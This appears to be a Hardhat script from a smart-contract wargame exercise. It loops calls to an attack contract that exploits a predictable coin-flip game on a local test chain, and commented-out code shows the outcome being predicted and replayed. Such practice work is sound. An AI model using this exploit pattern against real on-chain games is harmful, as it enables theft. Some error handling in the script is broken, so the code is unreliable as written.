const {ethers} = require("hardhat");
const hre = require("hardhat");

async function main() {
    const accounts = await ethers.getSigners();
    const baseContractFactory = await hre.ethers.getContractFactory('AttackConFlip');
    const payment1 = hre.ethers.utils.parseEther('1');
    const provider = hre.ethers.provider;
    // const coinFlipAttackContract = await baseContractFactory.deploy("0x8464135c8F25Da09e49BC8782676a84730C318bC");
    const coinFlipAttackContract = await hre.ethers.getContractAt('AttackConFlip', "0x5FbDB2315678afecb367f032d93F642f64180aa3");

    // await coinFlipAttackContract.deployed();
    // console.log(coinFlipAttackContract.address)

    // const payment = hre.ethers.utils.parseEther('0.0001');
    // console.log(fallbackContract)
    // let count = 0
    // while (count < 10) {
    //     console.log('here');
    //     const value = await getStaticValue(coinFlipContract);
    //     console.log(value);
    //     await execFunction(coinFlipContract, value);
    //     count = await getWins(coinFlipContract)
    //     console.log(count)
    // }
    // console.log('here');
    // const value1 = await getStaticValue(coinFlipContract);
    // console.log(value);
    // await execFunction(coinFlipContract, value1);
    // count = await getWins(coinFlipContract)
    // console.log(count)
    let val = 0
    while (val < 50) {
        try {
            await coinFlipAttackContract.attack();
            val = parseInt((await coinFlipAttackContract.count()).toString(), 10)
            console.log(val);
        } catch (e) {

        }
    }


}



async function getStaticValue(coinFlipContract) {
    return await coinFlipContract.callStatic.flip(true);
}

async function execFunction(coinFlipContract, value) {
    const tnx = await coinFlipContract.flip(value);
    await tnx.wait();
}

async function getWins(coinFlipContract) {
    const val = parseInt((await coinFlipContract.consecutiveWins()).toString(), 10,{ gasLimit: 2100000})
    console.log(val);
    return val;
}

main().then(r => console.log(r)).catch(console.error('ERR'));